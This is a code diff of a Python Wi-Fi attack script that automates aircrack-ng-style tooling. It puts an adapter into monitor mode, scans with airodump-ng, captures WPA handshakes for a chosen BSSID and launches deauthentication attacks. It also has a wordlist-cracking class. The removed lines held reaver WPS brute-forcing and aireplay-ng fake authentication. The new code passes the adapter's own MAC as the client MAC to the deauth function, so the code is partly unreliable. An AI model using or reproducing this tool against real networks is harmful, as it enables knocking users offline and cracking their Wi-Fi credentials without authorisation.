@@ -1,6 +1,5 @@
 import subprocess
-import re
-import argparse
+import getmac
 
 
 class WordlistAttackTool:
@@ -19,7 +18,7 @@ class WordlistAttackTool:
         print("Wordlist attack completed.")
 
 
-class WirelessSecurityTool:
+class WifiScan:
     def __init__(self, adapter):
         self.adapter = adapter
 
@@ -29,11 +28,6 @@ class WirelessSecurityTool:
         subprocess.run(["ifconfig", self.adapter, "down"])
         subprocess.run(["iwconfig", self.adapter, "mode", "monitor"])
         subprocess.run(["ifconfig", self.adapter, "up"])
-
-    def check_wps(self):
-        """Check for WPS enabled"""
-        print(f"Using {self.adapter} to check for WPS")
-        subprocess.run(["wash", "--interface", self.adapter])
 
     def deauth_attack(self, client_bssid, deauth_pack, client_mac):
         '''Deauth attack function'''
@@ -45,24 +39,32 @@ class WirelessSecurityTool:
     def capture_handshake(self):
         """Capture WPA handshake"""
         print("Capturing handshake")
-        wifi_mac = input("[+] Input Wi-Fi MAC address: ")
-        result = subprocess.check_output(["ifconfig", self.adapter], encoding="utf-8")
-        output = re.search(r"([A-Za-z0-9]+(-[A-Za-z0-9]+)+)", result)
-        print(output[0])
-        adapter_mac = input("[+] Input adapter MAC: ")
-        channel = input("[+] Input channel of Wi-Fi network: ")
 
-        client_bssid = input("[+] Input client BSSID: ")
+        # Get the current MAC address
+        current_mac = getmac.get_mac_address(interface=self.adapter)
+        print("Current MAC address:", current_mac)
+
         deauth_pack = int(input("[+] Input number of deauth packets: "))
-        client_mac = input("[+] Input client MAC address: ")
 
-        self.deauth_attack(client_bssid, deauth_pack, client_mac)
+        try:
+            print("[+] Press Control + C to stop scan")
+            subprocess.run(['airodump-ng', self.adapter])
+        except KeyboardInterrupt:
+            channel = input("[+] Input channel of Wi-Fi network: ")
+            client_bssid = input("[+] Input client BSSID: ")
+            handshake_file = input("[+] Input handshake file name: ")
+            cmd = [
+                'airodump-ng',
+                '--bssid', client_bssid,
+                '--channel', channel,
+                '--write', handshake_file,
+                self.adapter
+            ]
+            subprocess.run(cmd)
 
-        subprocess.run(['reaver', '--bssid', wifi_mac, '--channel', channel, '--interface', self.adapter, '-vvv',
-                        '--no-associate'])
-        subprocess.run(['aireplay-ng', '-1', '30', '-a', wifi_mac, '-h', adapter_mac, self.adapter])
+            self.deauth_attack(client_bssid, deauth_pack, current_mac)
 
-    def run_wireless_security_tool(self):
+    def run_wifi_scan(self):
         user_selection = self.get_user_selection()
 
         if user_selection == '1':
@@ -88,18 +90,8 @@ class WirelessSecurityTool:
 
 def main():
     adapter = input("[+] Input Wi-Fi adapter: ")
-    tool = WirelessSecurityTool(adapter)
-    tool.run_wireless_security_tool()
-
-
-if __name__ == "__main__":
-    main()
-
-
-def main():
-    adapter = input("[+] Input Wi-Fi adapter: ")
-    tool = WirelessSecurityTool(adapter)
-    tool.run_wireless_security_tool()
+    tool = WifiScan(adapter)
+    tool.run_wifi_scan()
 
 
 if __name__ == "__main__":
